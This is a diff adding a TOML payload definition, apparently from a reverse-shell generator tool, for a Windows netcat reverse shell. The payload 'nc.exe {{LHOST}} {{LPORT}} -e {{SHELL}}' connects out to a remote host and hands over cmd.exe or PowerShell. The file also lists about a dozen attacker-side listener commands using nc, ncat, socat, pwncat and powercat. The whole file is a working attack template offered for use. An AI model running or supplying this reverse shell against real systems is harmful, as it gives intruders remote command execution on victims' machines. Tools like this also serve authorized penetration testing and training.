@@ -1,0 +1,33 @@
+id = "nc_exe_e"
+name = "nc.exe -e"
+os = "windows"
+type = "reverse"
+proto = "tcp"
+lang = "cmd"
+description = "Uses Netcat for Windows (nc.exe) with the -e option to connect to the specified host and port over TCP, then spawns cmd.exe with its IO redirected through the socket."
+
+payload = "nc.exe {{LHOST}} {{LPORT}} -e {{SHELL}}"
+
+[listeners]
+nc = "nc -lvnp {{LPORT}}"
+nc_freebsd = "nc -lvn {{LPORT}}"
+busybox_nc = "busybox nc -lp {{LPORT}}"
+ncat = "ncat -lvnp {{LPORT}}"
+ncat_exe = "ncat.exe -lvnp {{LPORT}}"
+rlwrap_nc = "rlwrap -cAr nc -lvnp {{LPORT}}"
+rustcat = "rcat listen {{LPORT}}"
+pwncat = "python3 -m pwncat -lp {{LPORT}}"
+socat = "socat -d -d TCP-LISTEN:{{LPORT}} STDOUT"
+socat_tty = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
+powercat = "powercat -l -p {{LPORT}}"
+
+[shells]
+compatible = [
+	"cmd.exe",
+	"powershell.exe",
+	"pwsh.exe",
+	"C:/Windows/System32/cmd.exe",
+	"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe",
+	"C:/Program Files/PowerShell/7/pwsh.exe"
+]
+default = "cmd.exe"
